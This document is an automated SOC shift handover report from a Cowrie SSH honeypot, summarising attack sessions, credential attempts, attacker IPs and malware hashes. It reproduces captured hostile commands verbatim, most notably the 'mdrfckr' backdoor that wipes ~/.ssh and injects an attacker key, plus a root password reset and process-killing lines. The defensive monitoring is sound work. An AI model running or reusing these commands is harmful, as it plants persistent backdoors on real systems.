# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-20 |
| **Generated At** | 2026-03-20T04:13:33Z |
| **Shift Time** | 04:13 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **132** |
| Confirmed Threats | **95** |
| False Positives Filtered | **37** (28.0%) |
| Unique Attacker IPs | **50** |
| Countries of Origin | **17** |
| High Severity Cases | **5** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **127** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **36** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **29** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **5** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 5 |
| `admin` | 3 |
| `ubnt` | 2 |
| `gittest` | 1 |
| `kafka` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 2 |
| `12345678` | 1 |
| `password` | 1 |
| `blank2024` | 1 |
| `any` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `gittest` | `12345678` | 1 |
| `kafka` | `123` | 1 |
| `student4` | `password` | 1 |
| `blank` | `blank2024` | 1 |
| `sshd` | `any` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `q123456789` | `217.154.35.203` | 2026-03-20T01:43:26 |
| `root` | `3245gs5662d34` | `217.154.35.203` | 2026-03-20T01:43:30 |
| `root` | `121212` | `58.56.151.234` | 2026-03-20T03:08:14 |
| `root` | `qweasdzxc123.` | `120.48.55.25` | 2026-03-20T03:40:35 |
| `root` | `!@#QWEasd` | `120.48.55.25` | 2026-03-20T03:46:18 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:3kNpwXveMV7N"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.55.25`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `217.154.35.203`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **50** |
| Unique ASNs | **35** |
| High-Risk ASNs | **28** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (5)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a343cd3c420e

| Field | Detail |
|---|---|
| **Source IP** | `217.154.35[.]203` |
| **First Seen** | 2026-03-20 01:43 |
| **Last Seen** | 2026-03-20 01:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 01:43:25` | `cowrie.session.connect` |
| `2026-03-20 01:43:25` | `cowrie.client.version` |
| `2026-03-20 01:43:25` | `cowrie.client.kex` |
| `2026-03-20 01:43:26` | `cowrie.login.success` |
| `2026-03-20 01:43:26` | `cowrie.session.params` |
| `2026-03-20 01:43:26` | `cowrie.command.input` |
| `2026-03-20 01:43:26` | `cowrie.command.failed` |
| `2026-03-20 01:43:26` | `cowrie.log.closed` |
| `2026-03-20 01:43:27` | `cowrie.session.params` |
| `2026-03-20 01:43:27` | `cowrie.command.input` |
| `2026-03-20 01:43:27` | `cowrie.session.file_download` |
| `2026-03-20 01:43:27` | `cowrie.log.closed` |
| `2026-03-20 01:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.35[.]203` to AbuseIPDB if not already reported
- [ ] Block `217.154.35[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10fda6583979

| Field | Detail |
|---|---|
| **Source IP** | `217.154.35[.]203` |
| **First Seen** | 2026-03-20 01:43 |
| **Last Seen** | 2026-03-20 01:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 01:43:29` | `cowrie.session.connect` |
| `2026-03-20 01:43:29` | `cowrie.client.version` |
| `2026-03-20 01:43:29` | `cowrie.client.kex` |
| `2026-03-20 01:43:30` | `cowrie.login.success` |
| `2026-03-20 01:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.35[.]203` to AbuseIPDB if not already reported
- [ ] Block `217.154.35[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a72e163233d0

| Field | Detail |
|---|---|
| **Source IP** | `58.56.151[.]234` |
| **First Seen** | 2026-03-20 03:08 |
| **Last Seen** | 2026-03-20 03:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 03:08:12` | `cowrie.session.connect` |
| `2026-03-20 03:08:12` | `cowrie.client.version` |
| `2026-03-20 03:08:12` | `cowrie.client.kex` |
| `2026-03-20 03:08:14` | `cowrie.login.success` |
| `2026-03-20 03:08:15` | `cowrie.direct-tcpip.request` |
| `2026-03-20 03:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.56.151[.]234` to AbuseIPDB if not already reported
- [ ] Block `58.56.151[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8c5bb9a2cc4

| Field | Detail |
|---|---|
| **Source IP** | `120.48.55[.]25` |
| **First Seen** | 2026-03-20 03:40 |
| **Last Seen** | 2026-03-20 03:41 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:McK0dzOLqUuW"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 03:40:32` | `cowrie.session.connect` |
| `2026-03-20 03:40:32` | `cowrie.client.version` |
| `2026-03-20 03:40:32` | `cowrie.client.kex` |
| `2026-03-20 03:40:35` | `cowrie.login.success` |
| `2026-03-20 03:40:35` | `cowrie.session.params` |
| `2026-03-20 03:40:35` | `cowrie.command.input` |
| `2026-03-20 03:40:35` | `cowrie.command.failed` |
| `2026-03-20 03:40:35` | `cowrie.log.closed` |
| `2026-03-20 03:40:36` | `cowrie.session.params` |
| `2026-03-20 03:40:36` | `cowrie.command.input` |
| `2026-03-20 03:40:36` | `cowrie.session.file_download` |
| `2026-03-20 03:40:36` | `cowrie.log.closed` |
| `2026-03-20 03:40:50` | `cowrie.session.params` |
| `2026-03-20 03:40:50` | `cowrie.command.input` |
| `2026-03-20 03:40:50` | `cowrie.log.closed` |
| `2026-03-20 03:40:51` | `cowrie.session.params` |
| `2026-03-20 03:40:51` | `cowrie.command.input` |
| `2026-03-20 03:40:54` | `cowrie.log.closed` |
| `2026-03-20 03:40:54` | `cowrie.session.params` |
| `2026-03-20 03:40:54` | `cowrie.command.input` |
| `2026-03-20 03:40:54` | `cowrie.session.file_download` |
| `2026-03-20 03:40:54` | `cowrie.log.closed` |
| `2026-03-20 03:40:55` | `cowrie.session.params` |
| `2026-03-20 03:40:55` | `cowrie.command.input` |
| `2026-03-20 03:40:55` | `cowrie.log.closed` |
| `2026-03-20 03:40:55` | `cowrie.session.params` |
| `2026-03-20 03:40:55` | `cowrie.command.input` |
| `2026-03-20 03:40:55` | `cowrie.log.closed` |
| `2026-03-20 03:40:57` | `cowrie.session.params` |
| `2026-03-20 03:40:57` | `cowrie.command.input` |
| `2026-03-20 03:40:57` | `cowrie.command.input` |
| `2026-03-20 03:41:03` | `cowrie.log.closed` |
| `2026-03-20 03:41:11` | `cowrie.session.params` |
| `2026-03-20 03:41:11` | `cowrie.command.input` |
| `2026-03-20 03:41:14` | `cowrie.log.closed` |
| `2026-03-20 03:41:15` | `cowrie.session.params` |
| `2026-03-20 03:41:15` | `cowrie.command.input` |
| `2026-03-20 03:41:16` | `cowrie.log.closed` |
| `2026-03-20 03:41:18` | `cowrie.session.params` |
| `2026-03-20 03:41:18` | `cowrie.command.input` |
| `2026-03-20 03:41:18` | `cowrie.log.closed` |
| `2026-03-20 03:41:19` | `cowrie.session.params` |
| `2026-03-20 03:41:19` | `cowrie.command.input` |
| `2026-03-20 03:41:19` | `cowrie.log.closed` |
| `2026-03-20 03:41:20` | `cowrie.session.params` |
| `2026-03-20 03:41:20` | `cowrie.command.input` |
| `2026-03-20 03:41:20` | `cowrie.log.closed` |
| `2026-03-20 03:41:21` | `cowrie.session.params` |
| `2026-03-20 03:41:21` | `cowrie.command.input` |
| `2026-03-20 03:41:21` | `cowrie.log.closed` |
| `2026-03-20 03:41:22` | `cowrie.session.params` |
| `2026-03-20 03:41:22` | `cowrie.command.input` |
| `2026-03-20 03:41:22` | `cowrie.log.closed` |
| `2026-03-20 03:41:23` | `cowrie.session.params` |
| `2026-03-20 03:41:23` | `cowrie.command.input` |
| `2026-03-20 03:41:24` | `cowrie.log.closed` |
| `2026-03-20 03:41:25` | `cowrie.session.params` |
| `2026-03-20 03:41:25` | `cowrie.command.input` |
| `2026-03-20 03:41:26` | `cowrie.log.closed` |
| `2026-03-20 03:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.55[.]25` to AbuseIPDB if not already reported
- [ ] Block `120.48.55[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70dfb766d730

| Field | Detail |
|---|---|
| **Source IP** | `120.48.55[.]25` |
| **First Seen** | 2026-03-20 03:46 |
| **Last Seen** | 2026-03-20 03:46 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:3kNpwXveMV7N"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 03:46:17` | `cowrie.session.connect` |
| `2026-03-20 03:46:17` | `cowrie.client.version` |
| `2026-03-20 03:46:17` | `cowrie.client.kex` |
| `2026-03-20 03:46:18` | `cowrie.login.success` |
| `2026-03-20 03:46:19` | `cowrie.session.params` |
| `2026-03-20 03:46:19` | `cowrie.command.input` |
| `2026-03-20 03:46:19` | `cowrie.command.failed` |
| `2026-03-20 03:46:19` | `cowrie.log.closed` |
| `2026-03-20 03:46:20` | `cowrie.session.params` |
| `2026-03-20 03:46:20` | `cowrie.command.input` |
| `2026-03-20 03:46:20` | `cowrie.session.file_download` |
| `2026-03-20 03:46:20` | `cowrie.log.closed` |
| `2026-03-20 03:46:32` | `cowrie.session.params` |
| `2026-03-20 03:46:32` | `cowrie.command.input` |
| `2026-03-20 03:46:33` | `cowrie.log.closed` |
| `2026-03-20 03:46:33` | `cowrie.session.params` |
| `2026-03-20 03:46:33` | `cowrie.command.input` |
| `2026-03-20 03:46:34` | `cowrie.log.closed` |
| `2026-03-20 03:46:35` | `cowrie.session.params` |
| `2026-03-20 03:46:35` | `cowrie.command.input` |
| `2026-03-20 03:46:35` | `cowrie.session.file_download` |
| `2026-03-20 03:46:35` | `cowrie.log.closed` |
| `2026-03-20 03:46:36` | `cowrie.session.params` |
| `2026-03-20 03:46:36` | `cowrie.command.input` |
| `2026-03-20 03:46:36` | `cowrie.log.closed` |
| `2026-03-20 03:46:37` | `cowrie.session.params` |
| `2026-03-20 03:46:37` | `cowrie.command.input` |
| `2026-03-20 03:46:37` | `cowrie.log.closed` |
| `2026-03-20 03:46:38` | `cowrie.session.params` |
| `2026-03-20 03:46:38` | `cowrie.command.input` |
| `2026-03-20 03:46:38` | `cowrie.command.input` |
| `2026-03-20 03:46:39` | `cowrie.log.closed` |
| `2026-03-20 03:46:40` | `cowrie.session.params` |
| `2026-03-20 03:46:40` | `cowrie.command.input` |
| `2026-03-20 03:46:40` | `cowrie.log.closed` |
| `2026-03-20 03:46:41` | `cowrie.session.params` |
| `2026-03-20 03:46:41` | `cowrie.command.input` |
| `2026-03-20 03:46:42` | `cowrie.log.closed` |
| `2026-03-20 03:46:42` | `cowrie.session.params` |
| `2026-03-20 03:46:42` | `cowrie.command.input` |
| `2026-03-20 03:46:43` | `cowrie.log.closed` |
| `2026-03-20 03:46:45` | `cowrie.session.params` |
| `2026-03-20 03:46:45` | `cowrie.command.input` |
| `2026-03-20 03:46:46` | `cowrie.log.closed` |
| `2026-03-20 03:46:47` | `cowrie.session.params` |
| `2026-03-20 03:46:47` | `cowrie.command.input` |
| `2026-03-20 03:46:47` | `cowrie.log.closed` |
| `2026-03-20 03:46:49` | `cowrie.session.params` |
| `2026-03-20 03:46:49` | `cowrie.command.input` |
| `2026-03-20 03:46:49` | `cowrie.log.closed` |
| `2026-03-20 03:46:49` | `cowrie.session.params` |
| `2026-03-20 03:46:49` | `cowrie.command.input` |
| `2026-03-20 03:46:50` | `cowrie.log.closed` |
| `2026-03-20 03:46:50` | `cowrie.session.params` |
| `2026-03-20 03:46:50` | `cowrie.command.input` |
| `2026-03-20 03:46:50` | `cowrie.log.closed` |
| `2026-03-20 03:46:51` | `cowrie.session.params` |
| `2026-03-20 03:46:51` | `cowrie.command.input` |
| `2026-03-20 03:46:51` | `cowrie.log.closed` |
| `2026-03-20 03:46:52` | `cowrie.session.params` |
| `2026-03-20 03:46:52` | `cowrie.command.input` |
| `2026-03-20 03:46:52` | `cowrie.log.closed` |
| `2026-03-20 03:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.55[.]25` to AbuseIPDB if not already reported
- [ ] Block `120.48.55[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.55[.]25` | **17** | 2026-03-20 03:25 | 2026-03-20 03:53 | 28m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.232.212[.]207` | **15** | 2026-03-20 00:28 | 2026-03-20 00:38 | 26m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.193.35[.]202` | **9** | 2026-03-20 00:35 | 2026-03-20 00:38 | 2m | 4 | `T1110.001` | 🟢 LOW |
| `180.76.170[.]111` | **9** | 2026-03-20 01:45 | 2026-03-20 01:56 | 10m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `3.132.26[.]232` | **6** | 2026-03-20 02:30 | 2026-03-20 02:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.119.72[.]191` | **2** | 2026-03-20 02:38 | 2026-03-20 02:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `39.99.212[.]219` | **2** | 2026-03-20 00:18 | 2026-03-20 00:20 | 2m | 0 | `T1592` | 🟢 LOW |
| `47.90.139[.]56` | **2** | 2026-03-20 00:00 | 2026-03-20 00:01 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.3.43[.]242` | 1 | 2026-03-20 01:01 | 2026-03-20 01:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.53.23[.]141` | 1 | 2026-03-20 00:25 | 2026-03-20 00:25 | 31s | 0 | `T1592` | 🟢 LOW |
| `111.70.42[.]37` | 1 | 2026-03-20 01:10 | 2026-03-20 01:10 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.168.71[.]109` | 1 | 2026-03-20 00:18 | 2026-03-20 00:18 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.92.167[.]50` | 1 | 2026-03-20 03:26 | 2026-03-20 03:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.186.208[.]20` | 1 | 2026-03-20 01:44 | 2026-03-20 01:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.106[.]205` | 1 | 2026-03-20 01:47 | 2026-03-20 01:48 | 78s | 0 | `T1592` | 🟢 LOW |
| `152.32.235[.]36` | 1 | 2026-03-20 00:55 | 2026-03-20 00:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.178.194[.]123` | 1 | 2026-03-20 01:56 | 2026-03-20 01:56 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.181.133[.]153` | 1 | 2026-03-20 00:30 | 2026-03-20 00:30 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.185.29[.]233` | 1 | 2026-03-20 03:34 | 2026-03-20 03:34 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.189.85[.]66` | 1 | 2026-03-20 00:21 | 2026-03-20 00:21 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.53.52[.]68` | 1 | 2026-03-20 02:08 | 2026-03-20 02:08 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.145[.]55` | 1 | 2026-03-20 03:08 | 2026-03-20 03:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.56.216[.]153` | 1 | 2026-03-20 01:50 | 2026-03-20 01:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.56.162[.]181` | 1 | 2026-03-20 01:36 | 2026-03-20 01:36 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]98` | 1 | 2026-03-20 03:37 | 2026-03-20 03:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `196.188.187[.]205` | 1 | 2026-03-20 01:39 | 2026-03-20 01:39 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.55.85[.]196` | 1 | 2026-03-20 02:16 | 2026-03-20 02:16 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.123.169[.]104` | 1 | 2026-03-20 00:41 | 2026-03-20 00:41 | 12s | 0 | `T1592` | 🟢 LOW |
| `217.154.35[.]203` | 1 | 2026-03-20 01:43 | 2026-03-20 01:43 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.146.255[.]221` | 1 | 2026-03-20 01:20 | 2026-03-20 01:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.114[.]126` | 1 | 2026-03-20 01:59 | 2026-03-20 01:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.98[.]26` | 1 | 2026-03-20 04:05 | 2026-03-20 04:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.77.69[.]201` | 1 | 2026-03-20 00:56 | 2026-03-20 00:56 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.251.19[.]226` | 1 | 2026-03-20 00:00 | 2026-03-20 00:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.214.235[.]90` | 1 | 2026-03-20 02:11 | 2026-03-20 02:11 | 13s | 0 | `T1592` | 🟢 LOW |
| `90.189.152[.]114` | 1 | 2026-03-20 02:04 | 2026-03-20 02:05 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
